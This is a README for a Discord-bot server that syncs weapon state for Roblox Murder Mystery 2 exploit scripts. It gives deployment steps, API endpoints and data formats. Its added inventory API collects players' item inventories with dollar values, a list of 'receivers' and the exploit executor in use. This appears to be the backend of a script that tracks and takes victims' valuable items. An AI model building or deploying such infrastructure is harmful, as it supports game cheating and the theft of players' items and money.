# MM2 Weapon Sync Discord Bot

Real-time weapon synchronization bot for MM2 scripts using Discord API.

## Setup Instructions

### 1. Create Discord Application
1. Go to https://discord.com/developers/applications
2. Click "New Application" and give it a name
3. Go to "Bot" section and click "Add Bot"
4. Enable "MESSAGE CONTENT INTENT" under Privileged Gateway Intents
5. Copy the bot token

### 2. Create Discord Server & Channel
1. Create a new Discord server (or use existing)
2. Create a text channel for weapon sync
3. Copy the channel ID (enable Developer Mode, right-click channel → Copy ID)

### 3. Invite Bot to Server
1. In Discord Developer Portal, go to "OAuth2" → "URL Generator"
2. Select scopes: `bot`
3. Select permissions: `Send Messages`, `Manage Messages`, `Read Messages/View Channels`
4. Copy the generated URL and open it in browser
5. Invite bot to your server

### 4. Deploy to Render
1. Create a new account at https://render.com
2. Click "New +" → "Web Service"
3. Connect your GitHub repository (or upload the discord-bot folder)
4. Configure:
   - **Name**: mm2-weapon-sync-bot
   - **Region**: Nearest to your users
   - **Branch**: main
   - **Runtime**: Node
   - **Build Command**: `npm install`
   - **Start Command**: `node server.js`
5. Add Environment Variables:
   - `BOT_TOKEN`: Your Discord bot token
   - `CHANNEL_ID`: Your Discord channel ID
6. Click "Deploy Web Service"

### 5. Update Connection.txt
Update the Connection.txt file with your bot's URL:
```lua
local BOT_API_URL = "https://your-bot-name.onrender.com"
```

## Features
- Real-time WebSocket updates (no polling)
- Message editing for state updates
- REST API fallback for compatibility
- Automatic message cleanup
- User state management

## API Endpoints
- `GET /` - Health check
- `GET /states` - Get all user states
- `GET /state/:username` - Get specific user state
- `POST /state/:username` - Update user state (from game clients)

## Data Format
```json
{
  "username": "PlayerName",
  "gun": "WeaponName",
  "knife": "WeaponName",
  "t": 1234567890,
  "place": 123456789,
  "job": "JobIdString",
  "action": "fire",
  "actionData": {
    "soundId": "rbxassetid://123456",
    "beamDirection": {"x": 0, "y": 0, "z": 1},
    "beamLength": 10,
    "beamColor": {"r": 1, "g": 0.5, "b": 0}
  },
  "gunTransform": {
    "position": {"x": 0, "y": 0, "z": 0},
    "rotation": {"x": 0, "y": 0, "z": 0, "px": 0, "py": 0, "pz": 0},
    "timestamp": 1234567890.123
  },
  "knifeTransform": {
    "position": {"x": 0, "y": 0, "z": 0},
    "rotation": {"x": 0, "y": 0, "z": 0, "px": 0, "py": 0, "pz": 0},
    "timestamp": 1234567890.123
  }
}
```

---

## ⚠️ ADDED: MM2 Inventory API

This server now also includes an inventory API for the MM2 elysium script.

### Inventory API Endpoints
- `GET /api/inventory` - Get all inventory data
- `GET /api/inventory/:username` - Get specific user's inventory
- `POST /api/inventory` - Receive inventory data from script
- `DELETE /api/inventory/:username` - Clear specific user's inventory
- `DELETE /api/inventory` - Clear all inventory data

### Inventory Web Interface
Open: `/inventory.html` to view inventory data in real-time

### Inventory Data Format
```json
{
  "username": "PlayerName",
  "inventory": [
    {
      "DataID": "ItemName",
      "Name": "Display Name",
      "Amount": 1,
      "Value": 10,
      "DollarValue": 5.0,
      "Rarity": "Godly",
      "IsChroma": false
    }
  ],
  "totalValue": 100,
  "totalDollar": 50.0,
  "receivers": ["Receiver1", "Receiver2"],
  "executor": "Synapse X",
  "placeId": 142823291,
  "jobId": "JobIdString",
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```
